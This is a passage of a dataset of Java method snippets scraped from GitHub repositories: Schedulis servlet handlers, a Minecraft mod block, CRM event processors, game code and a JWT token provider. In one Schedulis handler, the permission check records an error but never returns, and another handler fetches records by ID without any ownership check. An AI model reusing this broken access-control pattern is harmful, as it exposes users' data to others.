HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        if(!userVariable.getOwner().equals(session.getUser().getUserId())){\n            ret.put(\"error\", \"No Access Permission\");\n        }\n        List<UserVariable> userVariables = this.userParamsService.fetchAllUserVariable(userVariable);\n        ret.put(\"userparams\", userVariables);\n        Map<String, String> sourceMap = loadUserParamsServletI18nData();\n        ret.put(\"modify\", sourceMap.get(\"modify\"));\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57771, "method_name": "ajaxAddUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxAddUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n\n        for(WtssUser user: userVariable.getUsers()){\n            if(!this.userParamsService.checkWtssUserIsExist(user.getUserId())){\n                ret.put(\"error\", \"Failed, User[\" + user.getUserId() + \"] not exist.\");\n                return;\n            }\n        }\n\n        userVariable.setOwner(session.getUser().getUserId());\n        if(this.userParamsService.addUserVariable(userVariable)){\n            ret.put(\"success\", \"Request Success\");\n        } else {\n            ret.put(\"error\", \"Request Failed\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57772, "method_name": "ajaxDeleteUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxDeleteUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        userVariable.setOwner(session.getUser().getUserId());\n        if(this.userParamsService.deleteUserVariable(userVariable)){\n            ret.put(\"success\", \"Request Success\");\n        } else {\n            ret.put(\"error\", \"Request Failed\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57773, "method_name": "ajaxUpdateUpdateUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxUpdateUpdateUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        userVariable.setOwner(session.getUser().getUserId());\n        for(WtssUser user: userVariable.getUsers()){\n            if(!this.userParamsService.checkWtssUserIsExist(user.getUserId())){\n                ret.put(\"error\", \"Failed, User[\" + user.getUserId() + \"] not exist.\");\n                return;\n            }\n        }\n        if(this.userParamsService.updateUserVariable(userVariable)){\n            ret.put(\"success\", \"Request Success\");\n        } else {\n            ret.put(\"error\", \"Request Failed\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57774, "method_name": "ajaxFetchUserVariableById", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxFetchUserVariableById(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        userVariable = this.userParamsService.getUserVariableById(userVariable.getId());\n        if(userVariable != null) {\n            ret.put(\"userparam\", userVariable);\n        } else {\n            ret.put(\"error\", \"Can not find.\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57775, "method_name": "ajaxLoadWtssUser", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxLoadWtssUser(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n\n        String searchName = req.getParameter(\"serach\");\n        int pageNum = getIntParam(req, \"page\");\n        int pageSize = getIntParam(req, \"pageSize\");\n        List<Map<String, Object>> webankUserSelectList = new ArrayList<>();\n        JSONObject items = new JSONObject();\n        try {\n            int webankUserTotalCount = this.userParamsService.getWtssUserTotal();\n            List<WtssUser> webankUserList = this.userParamsService.findAllWtssUserPageList(searchName, (pageNum-1) * pageSize, pageSize);\n\n            for(WtssUser webankUser : webankUserList){\n                Map<String, Object> selectItem = new HashMap<>();\n                selectItem.put(\"id\", webankUser.getUsername());\n                selectItem.put(\"username\", webankUser.getUsername());\n                selectItem.put(\"text\", webankUser.getFullName());\n                webankUserSelectList.add(selectItem);\n            }\n            ret.put(\"webankUserTotalCount\", webankUserTotalCount);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        ret.put(\"page\", pageNum);\n        ret.put(\"webankUserList\", webankUserSelectList);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 57776, "method_name": "initElements", "class_name": "RoughSandstoneBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57777, "method_name": "init", "class_name": "RoughSandstoneBlock", "params": ["FMLCommonSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FMLCommonSetupEvent event) {\n\t\tfor (Biome biome : ForgeRegistries.BIOMES.getValues()) {\n\t\t\tboolean biomeCriteria = false;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert_hills\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert_lakes\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (!biomeCriteria)\n\t\t\t\tcontinue;\n\t\t\tbiome.addFeature(GenerationStage.Decoration.UNDERGROUND_ORES, new OreFeature(OreFeatureConfig::deserialize) {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean place(IWorld world, ChunkGenerator generator, Random rand, BlockPos pos, OreFeatureConfig config) {\n\t\t\t\t\tDimensionType dimensionType = world.getDimension().getType();\n\t\t\t\t\tboolean dimensionCriteria = false;\n\t\t\t\t\tif (dimensionType == DimensionType.OVERWORLD)\n\t\t\t\t\t\tdimensionCriteria = true;\n\t\t\t\t\tif (!dimensionCriteria)\n\t\t\t\t\t\treturn false;\n\t\t\t\t\treturn super.place(world, generator, rand, pos, config);\n\t\t\t\t}\n\t\t\t}.withConfiguration(new OreFeatureConfig(OreFeatureConfig.FillerBlockType.create(\"roughsandstone\", \"roughsandstone\", blockAt -> {\n\t\t\t\tboolean blockCriteria = false;\n\t\t\t\tif (blockAt.getBlock() == Blocks.SANDSTONE.getDefaultState().getBlock())\n\t\t\t\t\tblockCriteria = true;\n\t\t\t\treturn blockCriteria;\n\t\t\t}), block.getDefaultState(), 32)).withPlacement(Placement.COUNT_RANGE.configure(new CountRangeConfig(32, 0, 0, 256))));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57778, "method_name": "getPickBlock", "class_name": "CustomBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\n\t\t\treturn new ItemStack(RoughSandstoneBlock.block, (int) (1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57779, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57780, "method_name": "notify", "class_name": "DefaultMarkedProcessor", "params": ["Event", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void notify(Event e, ConnectionSet conSet) throws BGException {\n        if (!(e instanceof ProcessMarkedActionEvent)) {\n            return;\n        }\n\n        ProcessMarkedActionEvent event = (ProcessMarkedActionEvent) e;\n\n        Connection con = conSet.getConnection();\n\n        ProcessDAO processDAO = new ProcessDAO(conSet.getConnection());\n\n        Config config = event.getProcessor().getConfigMap().getConfig(Config.class);\n\n        Command firstCommand = Utils.getFirst(config.getCommandList());\n\n        // \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \u043f\u0435\u0447\u0430\u0442\u0438 \u043c\u043e\u0436\u0435\u0442 \u0441\u0442\u043e\u044f\u0442\u044c \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0434\u043d\u0430\n        if (config.getCommandList().size() == 1 && firstCommand.getName().equals(COMMAND_PRINT)) {\n            ru.bgcrm.plugin.document.Config documentConfig = Setup.getSetup()\n                    .getConfig(ru.bgcrm.plugin.document.Config.class);\n\n            Pattern pattern = documentConfig.getPattern(\"processQueue\", firstCommand.getPatternId());\n            if (pattern == null) {\n                throw new BGException(\"Pattern not found.\");\n            }\n\n            HttpServletResponse response = event.getForm().getHttpResponse();\n\n            CommonDocumentGenerator generator = new CommonDocumentGenerator();\n\n            try {\n                OutputStream out = event.getForm().getHttpResponseOutputStream();\n\n                // \u0440\u0435\u0436\u0438\u043c \u043e\u0442\u043b\u0430\u0434\u043a\u0438\n                if (DocumentGenerateEvent.isDebug(event.getForm())) {\n                    response.setContentType(\"text/plain; charset=\" + Utils.UTF8.name());\n\n                    DocumentGenerateEvent docGenEvent = new DocumentGenerateEvent(event.getForm(), pattern,\n                            Process.OBJECT_TYPE, event.getProcessIds());\n                    generator.notify(docGenEvent, conSet);\n                    out.write(docGenEvent.getResultBytes());\n\n                    out.flush();\n                } else if (pattern.getType() == Pattern.TYPE_PDF_FORM) {\n                    Utils.setFileNameHeades(response, pattern.getDocumentTitle());\n\n                    Document document = new Document();\n\n                    PdfCopy copy = new PdfCopy(document, out);\n\n                    document.open();\n\n                    for (Integer processId : event.getProcessIds()) {\n                        DocumentGenerateEvent docGenEvent = new DocumentGenerateEvent(event.getForm(), pattern,\n                                Process.OBJECT_TYPE, Collections.singletonList(processId));\n                        generator.notify(docGenEvent, conSet);\n\n                        PdfReader reader = new PdfReader(docGenEvent.getResultBytes());\n\n                        int n = reader.getNumberOfPages();\n                        for (int page = 0; page < n;) {\n                            copy.addPage(copy.getImportedPage(reader, ++page));\n                        }\n\n                        copy.freeReader(reader);\n                        reader.close();\n                    }\n\n                    document.close();\n                } else if (pattern.getType() == Pattern.TYPE_XSLT_HTML || pattern.getType() == Pattern.TYPE_JSP_HTML) {\n                    response.setContentType(\"text/html; charset=\" + Utils.UTF8.name());\n\n                    DocumentGenerateEvent docGenEvent = new DocumentGenerateEvent(event.getForm(), pattern,\n                            Process.OBJECT_TYPE, event.getProcessIds());\n                    generator.notify(docGenEvent, conSet);\n\n                    out.write(docGenEvent.getResultBytes());\n\n                    out.flush();\n                }\n\n                event.setStreamResponse(true);\n            } catch (Exception ex) {\n                throw new BGException(ex);\n            }\n        } else {\n            try {\n                for (int processId : event.getProcessIds()) {\n                    Process process = processDAO.getProcess(processId);\n                    \n                    // \u043d\u0430\u0431\u043e\u0440 \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0445 \u043a\u043e\u043c\u0430\u043d\u0434 \u043f\u043e \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0435 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0430   \n                    List<String> commandList = new ArrayList<String>();\n\n                    for (Command command : config.getCommandList()) {\n                        String name = command.getName();\n                        if (name.equals(COMMAND_SET_STATUS)) {\n                            int statusId = event.getForm().getParamInt(\"statusId\");\n                            if (statusId != process.getStatusId())\n                                commandList.add(COMMAND_SET_STATUS + \":\" + statusId);\n                        } else if (name.equals(COMMAND_ADD_EXECUTORS)) {\n                            Collection<Integer> groupIds = event.getForm().getSelectedValues(\"group\");\n                            groupIds = CollectionUtils.subtract(groupIds, process.getGroupIds());\n                            if (!CollectionUtils.isEmpty(groupIds) )\n                                commandList.add(COMMAND_ADD_GROUPS + \":\" + Utils.toString(groupIds));\n                                    \n                            String executorIds = Utils.toString(event.getForm().getSelectedValues(\"executor\"));\n                            if (Utils.notBlankString(executorIds)) {\n                                commandList.add(COMMAND_ADD_EXECUTORS + \":\" + executorIds);\n                            }\n                        } else if (name.equals(COMMAND_SET_PARAM)) {\n                            String value = event.getForm().getParam(\"param\" + command.paramId);\n                            if (Utils.notBlankString(value)) {\n                                commandList.add(COMMAND_SET_PARAM + \":\" + command.paramId + \":\" + value);\n                            }\n                        }\n                    }\n                    \n\n                    ProcessCommandExecutor.processDoCommands(con, event.getForm(), process, null, commandList);\n\n                    con.commit();\n                }\n            } catch (Exception ex) {\n                throw new BGException(ex);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/DefaultMarkedProcessor.java", "stars": "12", "class_props": {"extends": "DynamicEventListener", "implements": null, "modifiers": ["public"]}}, {"id": 57781, "method_name": "getCommandList", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Command>", "snippet": "        public List<Command> getCommandList() {\n            return commandList;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/DefaultMarkedProcessor.java", "stars": "12", "class_props": {"extends": "ru", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57782, "method_name": "getName", "class_name": "Command", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getName() {\n            return name;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/DefaultMarkedProcessor.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57783, "method_name": "getAllowedIds", "class_name": "Command", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "        public List<Integer> getAllowedIds() {\n            return allowedIds;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/DefaultMarkedProcessor.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57784, "method_name": "getPatternId", "class_name": "Command", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getPatternId() {\n            return patternId;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/DefaultMarkedProcessor.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57785, "method_name": "getParamId", "class_name": "Command", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getParamId() {\n            return paramId;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/DefaultMarkedProcessor.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57786, "method_name": "getObject", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Type", "snippet": "    public Type getObject() {\n        return object;\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57787, "method_name": "getTitle", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57788, "method_name": "getIcon", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Drawable", "snippet": "    public Drawable getIcon() {\n        return icon;\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57789, "method_name": "getSubTitle", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSubTitle() {\n        return subTitle != null ? subTitle : \"\";\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57790, "method_name": "top", "class_name": "JetTemplateMethod", "params": ["List<PageFile>", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<PageFile>", "snippet": "    public static List<PageFile> top(List<PageFile> pageFiles, int number) {\n        return pageFiles.subList(0, number);\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/template/JetTemplateMethod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57791, "method_name": "groupBy", "class_name": "JetTemplateMethod", "params": ["List<Page>", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "TreeMap<String,List>", "snippet": "    public static TreeMap<String, List<Page>> groupBy(List<Page> pages, String type) {\n        var dateFormat = \"yyyy\";\n        if (type.trim().equals(\"month\")) {\n            dateFormat = \"yyyy-MM\";\n        }\n        String finalDateFormat = dateFormat;\n\n        Map<String, List<Page>> map = pages.stream()\n                .collect(Collectors.groupingBy(page -> DateUtil.format(page.getDate(), finalDateFormat)));\n        return MapUtil.sort(map, Comparator.reverseOrder());\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/template/JetTemplateMethod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57792, "method_name": "create", "class_name": "ParanoiaIncident", "params": ["EmpireView"], "throws": null, "modifiers": ["public", "static"], "return_type": "ParanoiaIncident", "snippet": "    public static ParanoiaIncident create(EmpireView ev) {\n        return new ParanoiaIncident(ev);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ParanoiaIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 57793, "method_name": "title", "class_name": "ParanoiaIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String title()            { return text(\"INC_PARANOIA_TITLE\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ParanoiaIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 57794, "method_name": "triggeredByAction", "class_name": "ParanoiaIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean triggeredByAction()   { return false; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ParanoiaIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 57795, "method_name": "description", "class_name": "ParanoiaIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description()      { \n        if (severity <= -50)\n            return decode(text(\"INC_PARANOIA_DESC5\"));\n        if (severity <= -17)\n            return decode(text(\"INC_PARANOIA_DESC4\"));\n        else if (severity <= -6)\n            return decode(text(\"INC_PARANOIA_DESC3\"));\n        else if (severity <= -2)\n            return decode(text(\"INC_PARANOIA_DESC2\"));\n        else \n            return decode(text(\"INC_PARANOIA_DESC1\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ParanoiaIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 57796, "method_name": "key", "class_name": "ParanoiaIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String key() {\n        return concat(\"Paranoia:\", str(dateOccurred));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ParanoiaIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 57797, "method_name": "decode", "class_name": "ParanoiaIncident", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String s) {\n        String s1 = super.decode(s);\n        s1 = galaxy().empire(empMe).replaceTokens(s1, \"my\");\n        s1 = galaxy().empire(empYou).replaceTokens(s1, \"your\");\n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ParanoiaIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 57798, "method_name": "main", "class_name": "VisitorTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        MuseumObjectStructure museumObjectStructure = new MuseumObjectStructure();\n\n        Mural mural = new Mural();\n        mural.setName(\"\u58c1\u753b\");\n        JadeArticle jadeArticle = new JadeArticle();\n        jadeArticle.setName(\"\u7389\u5668\");\n\n        museumObjectStructure.add(mural);\n        museumObjectStructure.add(jadeArticle);\n\n        Visitor chineseVisitor=new ChineseVisitor();\n        museumObjectStructure.accept(chineseVisitor);\n        System.out.println(\"------------------------\");\n        Visitor foreignVisitor = new ForeignVisitor();\n        museumObjectStructure.accept(foreignVisitor);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/VisitorTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57799, "method_name": "contractInfo", "class_name": "CardAction", "params": ["ActionMapping", "DynActionForm", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "    public ActionForward contractInfo(ActionMapping mapping, DynActionForm form, ConnectionSet conSet) throws BGException {\n        String billingId = form.getParam(\"billingId\");\n        int contractId = form.getParamInt(\"contractId\");\n        int moduleId = form.getParamInt(\"moduleId\");\n        int serviceId = form.getParamInt(\"serviceId\", -1);\n        List<CardActivationData> cardList = new ArrayList<>();\n        if (serviceId == -1) {\n            // \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0435\u043c \u0432\u0437\u044f\u0442\u044c \u043f\u0435\u0440\u0432\u0443\u044e \u0443\u0441\u043b\u0443\u0433\u0443\n            List<IdTitle> sList = new CardDAO(form.getUser(), billingId, moduleId).CardContractInfo(contractId, serviceId, cardList);\n            if (sList.size() > 0) {\n                serviceId = sList.get(0).getId();\n            }\n        }\n        cardList = new ArrayList<>();\n        form.getResponse().setData(\"serviceList\", new CardDAO(form.getUser(), billingId, moduleId).CardContractInfo(contractId, serviceId, cardList));\n        form.getResponse().setData(\"cardList\", cardList);\n        return data(conSet, mapping, form, \"contractInfo\");\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/struts/action/CardAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 57800, "method_name": "activateCard", "class_name": "CardAction", "params": ["ActionMapping", "DynActionForm", "ConnectionSet"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ActionForward", "snippet": "    public ActionForward activateCard(ActionMapping mapping, DynActionForm form, ConnectionSet conSet) throws BGException {\n        String billingId = form.getParam(\"billingId\");\n        int contractId = form.getParamInt(\"contractId\");\n        int moduleId = form.getParamInt(\"moduleId\");\n\n        String cardCode = form.getParam(\"cardCode\", \"\");\n        String pinCode = form.getParam(\"pinCode\", \"\");\n\n        if (Utils.isEmptyString(cardCode))\n            throw new BGMessageException(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u043a\u0430\u0440\u0442\u044b\");\n        if (Utils.isEmptyString(pinCode))\n            throw new BGMessageException(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 PIN-\u043a\u043e\u0434 \u043a\u0430\u0440\u0442\u044b\");\n        \n        new CardDAO(form.getUser(), billingId, moduleId).activateCard(contractId, cardCode, pinCode);\n        form.setParam(\"cardCode\", \"\");\n        form.setParam(\"pinCode\", \"\");\n        return contractInfo(mapping, form, conSet);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/struts/action/CardAction.java", "stars": "12", "class_props": {"extends": "BaseAction", "implements": null, "modifiers": ["public"]}}, {"id": 57801, "method_name": "afterPropertiesSet", "class_name": "TokenProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterPropertiesSet() {\n        byte[] keyBytes;\n        String secret = jHipsterProperties.getSecurity().getAuthentication().getJwt().getSecret();\n        if (!StringUtils.isEmpty(secret)) {\n            log.warn(\"Warning: the JWT key used is not Base64-encoded. \" +\n                \"We recommend using the `jhipster.security.authentication.jwt.base64-secret` key for optimum security.\");\n            keyBytes = secret.getBytes(StandardCharsets.UTF_8);\n        } else {\n            log.debug(\"Using a Base64-encoded JWT secret key\");\n            keyBytes = Decoders.BASE64.decode(jHipsterProperties.getSecurity().getAuthentication().getJwt().getBase64Secret());\n        }\n        this.key = Keys.hmacShaKeyFor(keyBytes);\n        this.tokenValidityInMilliseconds =\n            1000 * jHipsterProperties.getSecurity().getAuthentication().getJwt().getTokenValidityInSeconds();\n        this.tokenValidityInMillisecondsForRememberMe =\n            1000 * jHipsterProperties.getSecurity().getAuthentication().getJwt()\n                .getTokenValidityInSecondsForRememberMe();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", 